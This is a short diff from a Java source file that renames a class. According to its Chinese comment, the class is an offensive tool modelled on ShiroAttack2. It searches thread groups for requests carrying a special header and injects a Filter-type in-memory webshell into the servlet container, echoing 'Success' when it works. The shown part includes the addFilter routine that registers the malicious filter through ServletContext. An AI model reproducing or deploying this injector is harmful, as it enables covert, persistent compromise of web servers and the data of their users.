@@ -18,7 +18,7 @@ import java.util.List;
  * 遍历线程组，在 request 中查找带有特定 Header 的请求，并从 request 获取 ServletContext 添加 Filter 型内存马
  * 添加成功后，会回显 Success 字样，参考 ShiroAttack2
  */
-public class TFMSFromRequestF implements Filter {
+public class TFMSFromRequest implements Filter {
     public static HttpServletRequest request = null;
 
     public static HttpServletResponse response = null;
@@ -110,7 +110,7 @@ public class TFMSFromRequestF implements Filter {
 
     public static void addFilter() {
         ServletContext servletContext = request.getServletContext();
-        Filter         filter         = new TFMSFromRequestF();
+        Filter         filter         = new TFMSFromRequest();
         String         filterName     = NAME;
         String         url            = pattern;
         if (servletContext.getFilterRegistration(filterName) == null) {
